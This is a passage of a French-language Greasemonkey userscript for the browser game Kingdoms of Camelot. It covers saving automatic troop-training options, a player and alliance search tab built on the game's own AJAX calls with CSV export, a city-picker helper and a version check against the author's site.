    m+= "</select></td><td><input type=text value='"+ parseInt(TrainOptions.unitemin[cityId]) +"' id='aFunitemin_"+cityId+"' size=3></td><td align=right width=40%><span id='autoFError_"+cityId+"'></span></td></tr>"; 
    }
    
    m+="</table><table width=100% class=ptTab border=0><tr><td><u>Options divers :</u><br><input id=aFtimelauch type=text size=2 value='"+parseInt(TrainOptions.timelauch)+"'> secondes pour la formation de ville en ville (enregistrer et rafraichir pour prise en compte)\
         <br>Initier &agrave; <input type=text size=2 id='aFpourcpop' value='"+ parseInt(TrainOptions.pourcpop) +"'>% de\
         la population inactive disponible - utiliser <input type=text size=2 id='aFpourctot' value='"+ parseInt(TrainOptions.pourctot) +"'> % de population disponible.<br>";	   
    m+="</td><td with=50%><input type=button  value='Enregistrer' id=autoFSave></td></tr></table>"; 
    t.cont.innerHTML = m; 
    
    document.getElementById('autoFormationtoggle').addEventListener('click', function(){t.toggleautoFormationState(this)} , false);
    document.getElementById('autoFSave').addEventListener('click', t.saveOptionsAutoF , false);
    
  },
  
  saveOptionsAutoF: function() {
     var t = my.autoFormation;
     document.getElementById('autoFSave').style.backgroundColor="#F18888";
     TrainOptions.list={};
     TrainOptions.listactif={};
     TrainOptions.timelauch=document.getElementById('aFtimelauch').value;
     TrainOptions.pourcpop=document.getElementById('aFpourcpop').value;
     TrainOptions.pourctot=document.getElementById('aFpourctot').value;
     TrainOptions.unitemin={};
     for (var c=0; c<Cities.numCities; c++) {
        TrainOptions.list[Cities.cities[c].c.id] = document.getElementById('autoFType_'+Cities.cities[c].c.id).value;
        TrainOptions.listactif[Cities.cities[c].c.id] = document.getElementById('autoFCheck_'+Cities.cities[c].c.id).checked;
        TrainOptions.unitemin[Cities.cities[c].c.id]=document.getElementById('aFunitemin_'+Cities.cities[c].c.id).value;
     }
     saveTrainingOptions();
     setTimeout(function() {
     document.getElementById('autoFSave').style.backgroundColor="";
     }, 600);
  },
  toggleautoFormationState : function(obj) {
     var t = my.autoFormation;
     // on mémorise les listes déroulante !
     
     if (TrainOptions.Running == true) {
              TrainOptions.Running = false;
              obj.value = "FormationAUTO = OFF";
              saveTrainingOptions();
      }  else {
              TrainOptions.Running = true;
              obj.value = "FormationAUTO = ON";
              saveTrainingOptions();
      }
   },
 
    
};


/*** ONLGET RECHERCHE JOUEUR ET BIENTOT ALLIANCE ****/
my.AllianceList = {
  cont : null,
  nombre: null,
  state : null,
  dat : [],

  init : function (){
    var t = my.AllianceList;
    t.cont = document.createElement('div');
    //t.nombre=0;
    unsafeWindow.PTgetMembers = t.eventGetMembers;
    //unsafeWindow.PTDme = t.eventGetLienMember;
    unsafeWindow.PTpd = t.clickedPlayerDetail;
    unsafeWindow.PTpl = t.clickedPlayerLeaderboard;
    unsafeWindow.PCplo = t.clickedPlayerGetLastLogin;
    //unsafeWindow.PTalClickPrev = t.eventListPrev;
    //unsafeWindow.PTalClickNext = t.eventListNext;
    return t.cont;
  },
  getContent : function (){
    var t = my.AllianceList;
    return t.cont;
  },

  hide : function (){
    var t = my.AllianceList;

  },

  show : function (){
    var t = my.AllianceList;
    if (t.state == null){
    
     var m = '<DIV class=ptentry><TABLE width=100% cellpadding=0>\
              <TR><TD class=xtab align=right></td><TD class=xtab>Nom joueur (Contient) : &nbsp;</td>\
                <TD width=80% class=xtab><INPUT id=allPlayName size=20 type=text /> &nbsp; <INPUT id=playSubmit type=submit value="Cherche Joueur" /></td>\
              <TD class="xtab ptErrText"><SPAN id=ptplayErr></span></td></tr>\
            <TR><TD class=xtab>OU </td><TD class=xtab>Nom alliance (Contient) : &nbsp;</td>\
             <TD class=xtab><INPUT id=allAllName type=text /> &nbsp; <INPUT id=allSubmit type=submit value="Cherche Alliance" /></td>\
            <TD class="xtab ptErrText"><SPAN id=ptallErr></span></td></tr>\
             </table><span style="vertical-align:middle;" id=altInput></span></div>\
          <SPAN id=allListOut></span>';
      t.cont.innerHTML = m;
      
    document.getElementById('allSubmit').addEventListener ('click', t.eventSubmit, false);
    document.getElementById('playSubmit').addEventListener ('click', t.eventPlayerSubmit, false);
    document.getElementById('allPlayName').addEventListener ('focus', function (){document.getElementById('ptplayErr').innerHTML='';}, false);
    document.getElementById('allAllName').addEventListener ('focus', function (){document.getElementById('ptallErr').innerHTML='';}, false);
      t.state = 1;
    }
    
  },
  
  
  aName : '',
 eventSubmit : function (){
      var t = my.AllianceList;
      document.getElementById('ptallErr').innerHTML='';
      t.aName = document.getElementById('allAllName').value;
      
      if (t.aName.length < 3){
        document.getElementById('ptallErr').innerHTML = '3 caracteres minimum';
        return;
      }
      document.getElementById('altInput').innerHTML = '';
      document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER>Recherche en cours...</center>';
      t.fetchAllianceList (t.aName, null, t.eventGotAllianceList);
  },
  fetchAllianceList : function (allianceName, myAid, notify) {   // at least 3 chars :)
      var t = my.AllianceList;
      function combineResults (rsltA, rsltM, notify){
        if (!rsltA.ok){
          if (rsltA.msg.indexOf("No alliance found under")!=0 || !rsltM.ok){
            notify (rsltA);
            return;
          }
          rsltA.ok = true;
          rsltA.count = 0;
          rsltA.alliancesMatched = {};
        }
        if (rsltM.ok){
          rsltA.alliancesMatched['a'+rsltM.allianceInfo.allianceId] = {allianceId: rsltM.allianceInfo.allianceId, allianceName: rsltM.allianceInfo.allianceName,
                membersCount: rsltM.allianceInfo.members, relation: null, might: rsltM.allianceInfo.might, ranking: rsltM.allianceInfo.ranking};
          ++rsltA.count;
        }
        notify (rsltA);
      }
      unsafeWindow.AjaxCall.gPostRequest("allianceGetSearchResults.php",{allianceName:allianceName},
       function (rslt) {
          //if (myAid!=null && myAid>0) {
          
          //  t.fetchMyAllianceInfo  (function (r){ combineResults (rslt, r, notify)});
          if (!rslt.ok){
             document.getElementById('ptallErr').innerHTML = rslt.msg;
             //
          } else {
           notify (rslt);
          }
        },
        function (rslt) {
          document.getElementById('ptallErr').innerHTML = 'Erreur';
          document.getElementById('allListOut').innerHTML= '';
          //notify (rslt);
        });
    },

  fetchMyAllianceInfo : function (notify){
    unsafeWindow.AjaxCall.gPostRequest("allianceGetInfo.php",{},
      function (rslt) {
        notify (rslt);
      },
      function (rslt) {
        notify (rslt);
      });
  },
  eventGotAllianceList : function (rslt){
      var t = my.AllianceList;
      if (!rslt.ok){
        document.getElementById('allListOut').innerHTML = rslt.msg;
        return;
      }
      var m = '<DIV class=ptstat>R&eacute;sultat correspondant a <B>"'+ t.aName +'"</b></div>\
      <TABLE cellpadding=3 width=80% cellspacing=0 class=ptTab><TR><TD class=xtab  style="font-weight:bold;">Nom Alliance</td><TD class=xtab  style="font-weight:bold;">Rang</td><TD class=xtab style="font-weight:bold;">Membres</td>\
          <TD align=right class=xtab  style="font-weight:bold;">Puissance</td><TD class=xtab  style="font-weight:bold;">Diplomatie</td><TD class=xtab style="font-weight:bold;">Les Membres</td></tr>';
      for (k in rslt.alliancesMatched){
        var all = rslt.alliancesMatched[k];
        var dip = '';
        if (all.relation && all.relation==1)
          dip = 'Amicale';
        else if (all.relation && all.relation==2)
          dip = 'Hostile';
          
        if (all.ranking!=null) {
         m += '<TR><TD class=xtab>'+ all.allianceName +'</td><TD align=right class=xtab>'+ all.ranking +'</td><TD align=right class=xtab>'+ all.membersCount +'</td>\
          <TD align=right class=xtab >'+ addCommasInt(all.might) +'</td><TD class=xtab>'+ dip +'</td>\
          <TD class=xtab><a onclick="PTgetMembers('+ all.allianceId +')">Voir</a></td></tr>';
        }
      }
      document.getElementById('allListOut').innerHTML = m;
    },
  
  
    eventGetMembers : function (aid){
      var t = my.AllianceList;
      document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER>Recherche en cours...</center>';
      t.fetchAllianceMemberList (aid, null, t.eventGotMemberList);
  },
  fetchAllianceMemberList : function (allianceId, allianceName, notify) {
      var t = my.AllianceList;
      var c = {};
      c.action= "view_alliance_detail";
      if (allianceName)
        c.allianceName = allianceName;
      if (allianceId && allianceId != 0)
        c.allianceId = allianceId;
        
      unsafeWindow.AjaxCall.gPostRequest("getUserLeaderboard.php", c,
      function (rslt) {
          notify (rslt);
        },
      function (rslt) {
          notify (rslt);
      });
  },
  
  eventGotMemberList : function (rslt){
       var t = my.AllianceList;
       if (!rslt.ok){
         document.getElementById('allListOut').innerHTML = rslt.errorMsg;
         return;
       }
       t.memberListRslt = rslt;
       var uList = [];
       for (k in rslt.results)
         uList.push (rslt.results[k].userId);     
       t.fetchPlayerStatus (uList, function(r){t.eventGotMemberOnlineList(r)});    
   },    
   eventGotMemberOnlineList : function (rslt){
       var t = my.AllianceList;
       var numInvalid = 0;
       var numPlayers = 0;
       var myA = getMyAlliance ();
       t.dat = [];
       for (var i=0; i<t.memberListRslt.results.length; i++){
         p = t.memberListRslt.results[i];
         if (p.userId == 0){
           ++numInvalid;
         } else {
           ++numPlayers;
           //if ( myA[0] == p.allianceId)
           //  t.friendEta = true;
   	   //     else
           //   t.friendEta = false;
           for (var c=0; c<p.cities.length; c++){
              t.dat.push ([p.displayName, parseInt(p.might), p.officerType, parseInt(p.numCities), parseInt(p.cities[c].tileLevel),
                  parseInt(p.cities[c].xCoord), parseInt(p.cities[c].yCoord), p.cities[c].cityName, 0, c, p.userId, p.avatarId, p.playerSex, p.rank, rslt.data[p.userId]?1:0, 'NA']);
           }
         }
       }
       //t.setDistances (Cities.cities[0].x, Cities.cities[0].y);
       //t.ModelCity=Cities.cities[0];
       //t.setEta();
       t.displayMembers (t.memberListRslt.allianceName, numPlayers);
  },
  
  sortColNum : 1,
  sortDir : 1,
  
  displayMembers : function (allName, numPlayers){
      var t = my.AllianceList;
      function alClickSort (e){
        var t = my.AllianceList;
        var newColNum = e.id.substr(8);
        document.getElementById('clickCol'+t.sortColNum).className = 'clickable';
        e.className='clickable clickableSel';
        if (newColNum == t.sortColNum)
          t.sortDir *= -1;
        else
          t.sortColNum = newColNum;
        t.reDisp();
      }
      unsafeWindow.PTalClickSort = alClickSort;
      var m = '<STYLE>.clickable{background-color:#ddd; border:2px outset; border-color:#555; padding-left:5px; padding-right:5px}\
              .clickableSel{background-color:#ffffcc;}\
              .xxtab{background-color:none; padding-left:5px; padding-right:5px;} </style>\
        <DIV class=ptstat><TABLE id=tabAllMembers cellpadding=0  width=100%><TR font-weight:bold"><TD class=xtab> &nbsp; '+ allName +'</td>\
          <TD class=xtab width=80% align=center>Distance depuis <SPAN id=distFrom>'+ Cities.cities[0].name +' ('+ Cities.cities[0].x +','+ Cities.cities[0].y +')</span></td><TD class=xtab align=right>'+ numPlayers +' joueurs trouv&eacute;s &nbsp; </td></tr></table></div>';
       m += '<div style="top:190px;left:0px;width:100%; position:absolute;max-height:475px;height:470px;overflow:auto;">\
        <TABLE id=tabAllMembers align=center cellpadding=0 cellspacing=0><THEAD>\
        <TR style="font-weight:bold"><TD id=clickCol0 onclick="PTalClickSort(this)" class=clickable><A><DIV>Joueur</div></a></td>\
          <TD id=clickCol1 onclick="PTalClickSort(this)" class=clickable align=center><A><DIV>Puissance</a></div></td>\
          <TD id=clickCol3 onclick="PTalClickSort(this)" class=clickable><A><DIV>Villes</a></div></td>\
          <TD id=clickCol2 onclick="PTalClickSort(this)" class=clickable align=center><A><DIV>Titre</a></div></td>\
          <TD id=clickCol14 onclick="PTalClickSort(this)" class=clickable align=center><A><DIV>Ligne</a></div></td>\
          <TD id=clickCol7 onclick="PTalClickSort(this)" class=clickable><A><DIV>Ville</a></div></td>\
          <TD id=clickCol4 onclick="PTalClickSort(this)" class=clickable><A><DIV>Niv</a></div></td>\
          <TD id=clickCol5 onclick="PTalClickSort(this)" class=clickable><A><DIV>Coords</a></div></td>\
          <TD id=clickCol8 onclick="PTalClickSort(this)" class=clickable><A><DIV>Dist</a></div></td>\
          <TD id=clickCol15 onclick="PTalClickSort(this)" class=clickable><A><DIV>Est.</a></div></td>\
          <TD class=clickable><A><DIV>Connexion</div></a></td></tr></thead>\
        <tbody id=allBody ></tbody></table></div>\
        <DIV style="top:670px; left:0px; position:absolute; width:100%;  background-color:#ffffff; border-top:1px solid; margin-top:8px; color:#700; font-weight:bold;">\
          <TABLE width=100%><TR><TD class=xtab>Les donn&eacute;es proviennent du tableau d honneur ! (24h de d&eacutecalage)</td>\
          </tr></table></div>';        
      document.getElementById('allListOut').innerHTML = m;
      document.getElementById('altInput').innerHTML = '<HR><TABLE width=100% cellpaddding=0><TR align=center>\
          <TD class=xtab>Montrer la distance depuis : &nbsp; X: <INPUT size=2 type=text id="plyrX" /> Y: <INPUT size=2 type=text id="plyrY" /> &nbsp; Ou, choisissez une ville : <span id=dmcoords></span></td></tr></table>';
      document.getElementById('clickCol'+t.sortColNum).className = 'clickable clickableSel';
      t.reDisp();
      new CdispCityPicker ('plyrdcp', document.getElementById ('dmcoords'), true, t.eventCoords, 0).bindToXYboxes(document.getElementById('plyrX'), document.getElementById('plyrY'));
      document.getElementById('idFindETASelect').disabled = false;
      
 },
 
  // sort and display
    reDisp : function (){
      var t = my.AllianceList;
      
      function sortFunc (a, b){
            var t = my.AllianceList;
       if (typeof(a[t.sortColNum]) == 'number'){
               if (t.sortDir > 0)
                 return a[t.sortColNum] - b[t.sortColNum];
               else
                 return b[t.sortColNum] - a[t.sortColNum];
             } else if (typeof(a[t.sortColNum]) == 'boolean'){
           
       	return 0;        
             } else {
               if (t.sortDir > 0)
                 return a[t.sortColNum].localeCompare(b[t.sortColNum]);
               else
                 return b[t.sortColNum].localeCompare(a[t.sortColNum]);
        }
      }
      t.dat.sort (sortFunc);
      var m = '';
      var tbody = document.getElementById('allBody');
      tbody.innerHTML ='';
      tbody.style.maxHeight = '';
      var csvXL="";
      for (var i=0; i<t.dat.length; i++){ //
      	if (i % 2 == 0) {
          		 tabclass = 'xxtab';
          	} else {
          		tabclass = 'xxtab_even';
      	} 
          m += '<TR style="max-height:30px"><TD class=xxtab><a onclick=PTDme("' +  t.dat[i][0] +'");><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/avatars/25/'+t.dat[i][12]+''+t.dat[i][11]+'.jpg" align=absmiddle></a>&nbsp;<a onclick=getInfoForAnUser("'+ t.dat[i][10] +'");>'+ t.dat[i][0] +'</a></td><TD align=right class='+ tabclass +'>'+ addCommasInt(t.dat[i][1]) +'</td><TD align=center class='+ tabclass +'>'+ t.dat[i][3] +'</td>\
  	                <TD class='+ tabclass +'><span title="Classement : '+t.dat[i][13]+' joueur">'+ officerId2String(t.dat[i][2]) +'</span></td><TD class=xxtab>'+ (t.dat[i][14]?'<SPAN class=boldDarkRed>LIGNE</span>':'') +'</td><TD class='+ tabclass +'>'+ t.dat[i][7] +'</td><TD align=right class='+ tabclass +'>'+ t.dat[i][4] +'</td>\
  	                <TD align=center class='+ tabclass +'><DIV>\
  	                <a href="javascript:void(0)" onclick="cm.utils.CoordinateLinkController.onClick(event)" class="coordinateLink">('+ t.dat[i][5] +','+ t.dat[i][6] +')</a>\
  	                </div></td><TD align=right class=xxtab style="padding-right:20px;">'+ t.dat[i][8].toFixed(2) +'</td>';
         	 m += '<TD  nowrap class=xxtab>'+ (t.dat[i][15]?'<SPAN>'+ (t.dat[i][15]>0?timestr(t.dat[i][15],1):'NA') +'</span>':'<SPAN>NA</span>') +'</td><td class='+ tabclass +'><SPAN onclick="PCplo(this, \''+ t.dat[i][10] +'\');"><A>?</a></span><td></tr>';
  
  	csvXL += t.dat[i][0]+';'+t.dat[i][1]+';'+t.dat[i][5]+';'+t.dat[i][6]+';'+t.dat[i][4]+';'+t.dat[i][8]+';'+t.dat[i][7]+'\n';
      }
      m += '<tr><td colspan=11><textarea cols="55" rows="12" onclick="this.focus();this.select();" id="cutAndPaste" name="csv">Joueur;Puissance;X;Y;Niveau;Distance;Ville\n'+csvXL+'</textarea><br><b>Export XLS (pour toi public:</b><bR>Copiez le contenu de la zone, coller ensuite le contenu dans blocnote et enregistrer le fichier en .cvs</tr>';
     
     var tbody = document.getElementById('allBody');
      tbody.style.maxHeight = '';
      tbody.innerHTML = m;
      document.getElementById("cutAndPaste").innerHTML=csvXL;
      if (parseInt(tbody.clientHeight) > 475){
        tbody.style.height = '475px';
        tbody.style.maxHeight = '475px';
      }
  },
  
  eventPlayerSubmit : function (){
      var t = my.AllianceList;
      document.getElementById('ptplayErr').innerHTML='';
      var name = document.getElementById('allPlayName').value;
      name = name.replace(/\'/g,"_");
      t.pName = name;
      if (name.length < 3){
        document.getElementById('ptplayErr').innerHTML = 'Au moins 3 caracteres';
        return;
      }
      document.getElementById('altInput').innerHTML = '';
      document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER>En cours de recherche...</center>';
      t.fetchPlayerList (name, t.eventGotPlayerList);
  },
  clickedPlayerLeaderboard : function (span, uid){
      var t = my.AllianceList;
      span.onclick = '';
      span.innerHTML = "Recherche sur le tableau d'honneur ...";
      t.fetchLeaderboard (uid, function (r) {t.gotPlayerLeaderboard(r, span)});
  },
  fetchLeaderboard : function (uid, notify) {
    unsafeWindow.AjaxCall.gPostRequest("getUserLeaderboard.php",{action:"view_player_detail", player_id:uid},
    function(rslt){
        notify (rslt);
   	},function(rslt){
   	        notify (rslt);
    	});
  },
  fetchPlayerList : function (name, notify){  
    unsafeWindow.AjaxCall.gPostRequest("searchPlayers.php",{subType:"ALLIANCE_INVITE", searchName:name},
    function(rslt){
        notify (rslt);
   	},function(rslt){
   	        notify (rslt);
    	});
  },
  gotPlayerLeaderboard : function (rslt, span){
      var t = my.AllianceList;
      if (!rslt.ok){
        span.innerHTML = rslt.errorMsg;
        return;
      }
      if (rslt.totalResults == 0){
        span.innerHTML = "<B>Tableau d'honneur :</b> Pas trouv&eacute; ! (sous la brume ?)";
        return;
      }
      var p = rslt.data[0];
      
      /*var an = p.allianceName;
      if (!an || an=='' || p.officerType==4)
        an = 'Aucun';
      else
        an += ' ('+ officerId2String(p.officerType) +')';
      m = '<TABLE cellspacing=0 class=ptTab><TR><TD><B>Tableau Honneur : </b></td><TD colspan=2> Puissance : '+ p.might  +' &nbsp; Alliance : '+ an +'</td></tr>'; 
      for (var i=0; i<p.cities.length; i++){
        var c = p.cities[i];
        m += '<TR><TD align=right><B>Ville #'+ (i+1) +':</b></td><TD> &nbsp; '+ c.cityName 
        +' <a href="javascript:void(0)" onclick="KB.Controllers.MapHelper.gotoCoord('+ c.xCoord +',' +c.yCoord+ ')" class="coordinateLink">('+ c.xCoord +',' +c.yCoord+ ')</a></td><TD width=75%> &nbsp; Niveau : '
  
          + c.tileLevel +' &nbsp; &nbsp; status: '+ cityStatusString (c.cityStatus) +' &nbsp; &nbsp; cr&eacute;de : ' + c.dateCreated.substr(0,10) +'</td></tr>';
      }  */
      //span.innerHTML = m + '</table>';
      span.innerHTML = "<B>Tableau d'honneur :</b> En cours de construction<br>Nombre de villes :"+p.numOfCities+"<br>Nombre de Terres : "+p.numOfWilds;
  },
   eventGotPlayerList : function (rslt){
      var t = my.AllianceList;
      if (!rslt.ok){
        document.getElementById('allListOut').innerHTML = rslt.msg;
        return;
      }
      t.playerList = rslt.matchedUsers;
      var uList = [];
      for (k in rslt.matchedUsers)
            uList.push (rslt.matchedUsers[k].userId);     
      t.fetchPlayerStatus (uList, function(r) {t.eventGotPlayerOnlineList(r)});    
  },  
  fetchPlayerStatus : function (uidArray, notify){
        unsafeWindow.AjaxCall.gPostRequest("getOnline.php",{checkArr:uidArray.join(',')},
	    function(rslt){
	        notify (rslt);
    	},function(rslt){
	        notify (rslt);
    	}); 
    },
    fetchPlayerStatusSimple : function (uid, notify){
            unsafeWindow.AjaxCall.gPostRequest("getOnline.php",{checkArr:uid},
              function (rslt) {
                notify (rslt);
              },
              function (rslt) {
                notify (rslt);
              }      );
    }, 
   fetchPlayerInfo : function (uid, notify){
          unsafeWindow.AjaxCall.gPostRequest("getUserGeneralInfo.php",{uid:uid},
	 	    function(rslt){
	 	        notify (rslt);
	     	},function(rslt){
	 	        notify (rslt);
    	}); 
  },
   clickedPlayerDetail : function (span, uid){
        var t = my.AllianceList;
        span.onclick = '';
        span.innerHTML = "Recherche d&eacute;tails ...";
        t.fetchPlayerInfo (uid, function (r) {t.gotPlayerDetail(r, span)});
  },
   gotPlayerDetail : function (rslt, span){
      var t = my.AllianceList;
      if (!rslt.ok){
        span.innerHTML = rslt.errorMsg;
        return;
      }
      var u = rslt.userInfo[0];
      var a = 'Aucun';
      if (u.allianceName)
        a = u.allianceName +' ('+ getDiplomacy(u.allianceId) + ')';
      var m = '<TABLE cellspacing=0 class=ptTab><TR><TD><B>D&eacute;tails:</b> &nbsp; </td><TD>Alliance : '+ a +' &nbsp; Villes : '
            + u.cities +' &nbsp; Population : '+ u.population +'</td></tr><TR><TD></td><TD>Provinces : ';
      var pids = u.provinceIds.split (',');
      var p = [];
      for (var i=0; i<pids.length; i++)
        p.push(unsafeWindow.arStrings.provinceName['p'+pids[i]]);
      span.innerHTML = m + p.join (', ') +'</td></tr></table>';
  },
   eventGotPlayerOnlineList : function (rslt){
          var t = my.AllianceList;
          if (!rslt.ok){
            document.getElementById('allListOut').innerHTML = rslt.errorMsg;
            return;
      }
      var m = '<DIV class=ptstat>R&eacute;sultat correspondant &agrav; <B>"'+ t.pName +'"</b></div>\
        <DIV style="height:575px; max-height:575px; overflow-y:auto">\
        <TABLE width=95% align=center class=ptTab cellspacing=0><TR style="font-weight:bold"><TD width=20%>Nom</td>\
        <TD align=right>Puissance &nbsp;&nbsp;&nbsp;&nbsp;</td><TD>&nbsp;</td><TD width=60%>Informations suppl&eacute;mentaires</td></tr>';
      var row=0;
      var cl='';
      for (k in t.playerList){
        var u = t.playerList[k];
        if (++row % 2)
          cl = 'class=ptOddrow ';
        else
          cl = '';
          if (u.allianceName) { var alliancenammme=u.allianceName; }else {var alliancenammme="---"; }
        m += '<TR '+ cl +'valign=top><TD>'+ u.genderAndName +'<br>'+alliancenammme+'<br><A target="_tab" href="http://www.facebook.com/profile.php?id='+ u.fbuid +'">profile</a></td><TD align=center>&nbsp;'+ addCommasInt(u.might) +'&nbsp;</td>\
            <TD>'+ (rslt.data[u.userId]?"&nbsp;<SPAN class=boldDarkRed>En ligne</span>":"") +'</td>\
           <TD><SPAN onclick="PTpd(this, '+ u.userId +')"><A>D&eacute;tails</a></span></td></tr>';
      }
      m += '</table></div>';
      document.getElementById('allListOut').innerHTML = m;
  },
  
  
  clickedPlayerGetLastLogin : function (span, uid){
        var t = my.AllianceList;
        //span.onclick = '';
        //span.innerHTML = "Recherche...";
        //t.fetchPlayerLastLogin (uid, function (r) {t.gotPlayerLastLogin(r, span)});
  },
  fetchPlayerLastLogin : function (uid, notify){
     
       unsafeWindow.AjaxCall.gPostRequest("viewCourt.php",{pid:uid},
      	   function(rslt){
      	        notify (rslt);
           },
           function(rslt){
      	        notify (rslt);
      });
  },
  gotPlayerLastLogin : function (rslt, span){
        var t = my.AllianceList;
        if (!rslt.ok){
          span.innerHTML = rslt.errorMsg;
          return;
        }
    
        var p = rslt.playerInfo;
        var lastLogin = rslt.playerInfo.lastLogin;
        
        if (lastLogin) {
          m = '<span style="color:black">'+lastLogin+'</span>';
        } else {
           m = '<span style="color:red">?</span>';
        }  
        span.innerHTML = m + '';
  },
}



function CdispCityPicker (id, span, dispName, notify, selbut){
  function CcityButHandler (t){
    var that = t;
    this.clickedCityBut = clickedCityBut;
    function clickedCityBut (e){
      if (that.selected != null)
        that.selected.className = "castleBut castleButNon";
      that.city = Cities.cities[e.target.id.substr(that.prefixLen)];
      if (that.dispName)
        document.getElementById(that.id+'cname').innerHTML = that.city.c.name;
      e.target.className = "castleBut castleButSel";
      that.selected = e.target;
      if (that.coordBoxX){
        that.coordBoxX.value = that.city.c.x;
        that.coordBoxY.value = that.city.c.y;
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
      }
      if (that.notify != null)
        that.notify(that.city, that.city.c.x, that.city.c.y);
    }
  }

  function selectBut (idx){
    document.getElementById(this.id+'_'+idx).click();
  }

  function bindToXYboxes (eX, eY){
    function CboxHandler (t){
      var that = t;
      this.eventChange = eventChange;
      if (that.city){
        eX.value = that.city.c.x;
        eY.value = that.city.c.y;
      }
      function eventChange (){
        var x = parseInt(that.coordBoxX.value, 10);
        var y = parseInt(that.coordBoxY.value, 10);
        if (isNaN(x) || x<0 || x>750){
          that.coordBoxX.style.backgroundColor = '#ff8888';
          return;
        }
        if (isNaN(y) || y<0 || y>750){
          that.coordBoxY.style.backgroundColor = '#ff8888';
          return;
        }
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
        if (that.notify != null)
          that.notify (null, x, y);
      }
    }
    
    this.coordBoxX = eX;
    this.coordBoxY = eY;
    var bh = new CboxHandler(this);
    eX.size=2;
    eX.maxLength=3;
    eY.size=2;
    eY.maxLength=3;
    eX.addEventListener('change', bh.eventChange, false);
    eY.addEventListener('change', bh.eventChange, false);
  }

  this.selectBut = selectBut;
  this.bindToXYboxes = bindToXYboxes;
  this.coordBoxX = null;
  this.coordBoxY = null;
  this.id = id;
  this.dispName = dispName;
  this.prefixLen = id.length+1;
  this.notify = notify;
  this.selected = null;
  this.city = null;
  var m = '';
  for (var i=0; i<Cities.cities.length; i++)
    m += '<INPUT class="castleBut castleButNon" id="'+ id +'_'+ i +'" value="'+ (i+1) +'" type=submit \>';
  if (dispName)
    m += ' &nbsp; <SPAN style="display:inline-block; width:85px; font-weight:bold;" id='+ id +'cname' +'></span>';
  span.innerHTML = m;
  var handler = new CcityButHandler(this);
  for (var i=0; i<Cities.cities.length; i++)
    document.getElementById (id+'_'+i).addEventListener('click', handler.clickedCityBut, false);
  if (selbut != null)
    this.selectBut(selbut);
}



function setTabStyle (e, selected){
  if (selected){
    e.className = 'matTabSel';
  } else {
    e.className = 'matTabNotSel';
  }
}

function clickedTab (e){
  who = e.target.id.substring(2);
  newObj = my[who];
  currentObj = my[currentName];
  if (currentName != who){
    setTabStyle (document.getElementById ('aa'+currentName), false);
    setTabStyle (document.getElementById ('aa'+who), true);
    if (currentObj){
      currentObj.hide ();
      currentObj.getContent().style.display = 'none';
    }
    currentName = who;
    cont = newObj.getContent();
    newObj.getContent().style.display = 'block';
  }
  newObj.show();
}

function mouseMainTab (me){
  if (me.button == 2){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    mainPop.setLocation ({x: c.x+4, y: c.y+c.height});
  }
}

function eventHideShow (){
  if (mainPop.toggleHide(mainPop)){
    my[currentName].show();
    Options.ptWinIsOpen = true;
  } else {
    my[currentName].hide();
    Options.ptWinIsOpen = false;
  }
  saveOptions();
}


function hideMe (){
  mainPop.show (false);
  my[currentName].hide();
  Options.ptWinIsOpen = false;
  saveOptions();
}

function logit (msg){
  var serverID = getServerId();
  var now = new Date();
  GM_log (serverID +' @ '+ now.toTimeString().substring (0,8) +'.' + now.getMilliseconds() +': '+  msg);
}

function saveOptions (){
  var serverID = getServerId();
  GM_setValue ('BOOptions_'+serverID, JSON2.stringify(Options));
}

function readOptions (){
  var serverID = getServerId();
  s = GM_getValue ('BOOptions_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts)
      Options[k] = opts[k];
  }
}

function saveTrainingOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('TrainingOptions_' +serverID, JSON2.stringify(TrainOptions));}, 0);
}

function readTrainingOptions (){
  var serverID = getServerId();
  s = GM_getValue ('TrainingOptions_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
        TrainOptions[k] = opts[k];
    }
  }
}

function createButton (label){
  var a=document.createElement('a');
  a.className='button20';
  a.innerHTML='<span style="color: #ff6">'+ label +'</span>';
  return a;
}

function AddMainTabLink(text, eventListener, mouseListener) {
  var a = createButton (text);
  a.className='tab';
  a.id = 'Boite';
  var tabs=document.getElementById('main_engagement_tabs');
  if(tabs) {
      //document.getElementById('trialpay_dealspot').parentNode.removeChild(document.getElementById('trialpay_dealspot'));
      tabs.insertBefore (a, tabs.firstChild);
      //tabs.appendChild(a);
    a.addEventListener('click',eventListener, false);
    if (mouseListener != null)
      a.addEventListener('mousedown',mouseListener, true);
      
      

       GM_xmlhttpRequest({method:"GET",url:"http://beworld.perso.sfr.fr/glory/BOGOR.user.js",onload:function(a){var b=/\/\/\s*@version\s+(.+)\s*\n/i.exec(a.responseText);
       var c=Version;if(b){if(b[1]>c){
       var eNewMAJ=createButton ("BAO "+b[1]+" dispo !");
       eNewMAJ.className='tab';
       eNewMAJ.id="BOUpdate";
       eNewMAJ.title="Mettez a jour votre boite a outils !";
       tabs.insertBefore(eNewMAJ,tabs.firstChild);
       eNewMAJ.addEventListener('click',function() {
               window.open('http://beworld.perso.sfr.fr/glory/'); //redirection sur mon site
       }, false);
       
       }}},onerror:function(a){}})

    return a;
  }
  
  
  
  return null;
}


function setCities(){
 if (unsafeWindow.player.cities) {
  var nbville=0;
  Cities.cities = [];
  Cities.byID = {};
   unsafeWindow.player.allCities().each(function(c){
    city = {};
    city.idx = nbville;
    city.id = parseInt(c.id);
    city.c = c;
    Cities.cities[nbville] = city;
    Cities.byID[c.id] = city;
     nbville++;
   });
  Cities.numCities = nbville;
 }
}
 
function getMyAlliance(){
  if (unsafeWindow.seed.allianceDiplomacies==null || unsafeWindow.seed.allianceDiplomacies.allianceName==null)
    return [0, 'Aucune'];
  else
    return [unsafeWindow.seed.allianceDiplomacies.allianceId, unsafeWindow.seed.allianceDiplomacies.allianceName];
}
// returns: 'neutral', 'friendly', or 'hostile'
function getDiplomacy (aid) {
  if (unsafeWindow.seed.allianceDiplomacies == null)
    return 'neutral';
  if (unsafeWindow.seed.allianceDiplomacies.friendly && unsafeWindow.seed.allianceDiplomacies.friendly['a'+aid] != null)
